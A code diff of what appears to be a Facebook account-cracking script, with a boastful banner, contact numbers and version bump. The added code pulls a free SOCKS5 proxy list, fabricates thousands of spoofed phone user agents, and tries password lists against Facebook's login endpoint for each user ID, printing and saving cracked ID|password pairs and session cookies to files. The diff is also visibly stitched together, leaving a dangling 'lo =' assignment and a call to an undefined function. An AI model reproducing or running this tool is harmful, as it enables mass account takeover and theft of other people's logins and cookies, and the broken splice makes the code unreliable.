@@ -308,7 +308,7 @@ def banner():
 ║ [😆] CODED BY : Shawon    
 ║ [😕] GITHUB   : Shawon-404            
 ║ [😕] GITHUB   : Milon-404
-║ [❤️] VERSION  : 0.0.2      
+║ [❤️] VERSION  : 0.0.5    
         WhatsApp → 01887727274
         WhatsApp → 01863700546
 ║ HACKED   : \033[1;32mSC.Shawon \033[1;37m              
@@ -316,7 +316,7 @@ def banner():
     print(f"""{GREEN}    SELL DONE{P}
  {K}[{H}√{K}]{P} This message is for my haters 
  {K}[{H}√{K}]{P}       {H} The Shawon Is BACK 
- {K}[{H}√{K}]{P} Successfully Update Done {H}0.0.1""");print(led)
+ {K}[{H}√{K}]{P} Successfully Update Done {H}0.0.5""");print(led)
 
 
 c0=('ht')
@@ -1183,39 +1183,56 @@ def m5(idf,pw):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
-   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
-   log_cookies=session.cookies.get_dict().keys()
-   if 'c_user' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    user = re.findall('c_user=(.*);xs', coki)[0]
-    print('\r\033[1;32m [Shawon-OK] '+user+'|'+ps) #+'--'+coki)
-    if 'y' in cokix:
-     print(f'\r{gen}{H}'+coki)
-    ok+=1 
-    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
-    ok.append(user)
-    break
-   elif 'checkpoint' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    coki1 = coki.split("1000")[1]
-    uid = "1000"+coki1[0:11]
-    if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mShawon-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
-    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
-    cp.append(idf)
-   else:
-    continue
-  loop+=1
-  
- except:
-  pass 
-# INDIA X PAKISTAN -- MAIN DEF #
+   lo = 
+try:
+    proxx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
+except:
+    print(" [✓] INTERNET CONNECTION ERROR")
+    sys.exit()
+open('.prox.txt','w').write(proxx)
+pxx=open(".prox.txt","r").read().splitlines()
 
-if __name__=='__main__':
-  try:os.mkdir('Shawon-YT' )
-  except:pass
-  try:os.mkdir('Shawon-YT')
-  except:pass
-#  b2()
-#  mainx() 
-  mainx()
+for xd in range(50000):
+    aa='Mozilla/5.0 (Linux; U; Android 11;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='fr-fr; Redmi Note 11 Build/'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+
+def random_subb(uid,pwx,fb,fb1):
+    global oks,cps,ugen,loop,pxx
+    sys.stdout.write(f"\r\033[38;5;46m[EMRAN-XD] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
+    session=requests.Session()
+    try:
+        for ps in pwx:
+            free_fb = session.get(f'https://{fb}.facebook.com').text
+            prox=random.choice(pxx)
+            uuu=random.choice(ugen)
+            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
+            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
+            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update,proxies=prox).text
+            eehhcc=session.cookies.get_dict().keys()
+            if "c_user" in eehhcc:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                sort=coki.split("sb=")[1]
+                coki1=coki.split("1000")[1]
+                xd="1000"+coki1[0:11]
+                print(f"\r\r\033[38;5;46m[EMRAN-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
+                open("/sdcard/Emran-ok.txt","a").write(xd+"|"+ps+"\n")
+                oks.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        time.sleep(4)
+sykology()
